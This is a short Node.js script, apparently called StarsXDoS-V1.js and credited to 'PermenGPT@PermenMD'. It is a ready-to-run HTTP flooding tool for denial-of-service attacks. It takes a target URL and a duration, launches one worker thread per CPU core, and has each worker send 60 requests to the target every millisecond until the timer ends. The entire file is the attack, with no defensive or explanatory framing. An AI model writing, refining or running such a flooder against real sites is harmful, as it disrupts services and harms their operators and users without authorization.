// Created by PermenGPT@PermenMD

const { Worker, isMainThread, parentPort } = require('worker_threads');

if (isMainThread) {
    const target = process.argv[2];
    const duration = process.argv[3];

    if (process.argv.length < 3 || isNaN(parseInt(duration))) {
        console.log('Invalid Usage: node StarsXDoS-V1.js URL DURATION.');
        process.exit(1);
    } else {
        const numThreads = require('os').cpus().length;
        const totalRequests = numThreads * 60;
        let permen = 0;

        const attackInterval = setInterval(() => {
            permen += totalRequests;
            //console.log(`Total Requests: ${permen}`);
        }, 1000);

        setTimeout(() => {
            clearInterval(attackInterval);
            console.log('Attack stopped.');
            process.exit(0);
        }, duration * 1000);

        for (let i = 0; i < numThreads; i++) {
            new Worker(__filename, { workerData: { target } });
        }
    }
} else {
    const { target } = require('worker_threads').workerData;

    setInterval(() => {
        for (let i = 0; i < 60; i++) {
            fetch(target).catch(error => {});
        }
    }, 1);
}
